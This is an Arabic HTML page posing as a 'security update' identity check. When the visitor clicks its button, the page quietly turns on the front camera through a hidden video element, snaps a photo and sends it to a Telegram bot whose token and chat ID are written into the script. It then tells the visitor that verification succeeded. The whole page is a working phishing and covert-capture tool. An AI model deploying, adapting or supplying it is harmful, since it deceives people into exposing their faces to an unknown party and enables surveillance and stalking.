<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 100px; background: #fff; }
        #video { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        canvas { display: none; }
        .btn { background: #0088cc; color: white; padding: 15px 30px; border: none; border-radius: 50px; font-size: 18px; cursor: pointer; box-shadow: 0 4px 15px rgba(0,0,0,0.2); transition: 0.3s; }
        .btn:active { transform: scale(0.95); }
    </style>
</head>
<body>

    <div id="main">
        <h2>تحديث أمني للنظام</h2>
        <p>يرجى الضغط على الزر أدناه لتأكيد هويتك ومتابعة التصفح.</p>
        <button class="btn" id="startBtn">تأكيد الهوية الآن</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

<script>
    // تم وضع بياناتك هنا مباشرة
    const botToken = "8667481771:AAFKgGalPrXf7paI5X8-7WkqkgZEiBqgKuc"; 
    const chatId = "6492264194";     

    const startBtn = document.getElementById('startBtn');
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    startBtn.addEventListener('click', () => {
        startBtn.innerText = "جاري التحقق...";
        startBtn.disabled = true;
        
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            video.srcObject = stream;
            
            // انتظر ثانيتين حتى تستقر الكاميرا ثم التقط الصورة
            setTimeout(() => {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, 'capture.png');
                    formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط');

                    // إرسال الصورة للبوت الخاص بك
                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => {
                        alert("تم تأكيد الهوية بنجاح، شكراً لك.");
                        // إيقاف الكاميرا فوراً
                        stream.getTracks().forEach(track => track.stop());
                        startBtn.innerText = "تم التحقق";
                    })
                    .catch(err => {
                        console.error("خطأ في الإرسال:", err);
                        startBtn.innerText = "فشل الإرسال";
                    });
                }, 'image/png');

            }, 2000); 
        })
        .catch(err => {
            alert("خطأ: يرجى الموافقة على طلب النظام (سماح) للمتابعة.");
            startBtn.innerText = "تأكيد الهوية الآن";
            startBtn.disabled = false;
        });
    });
</script>
</body>
</html>
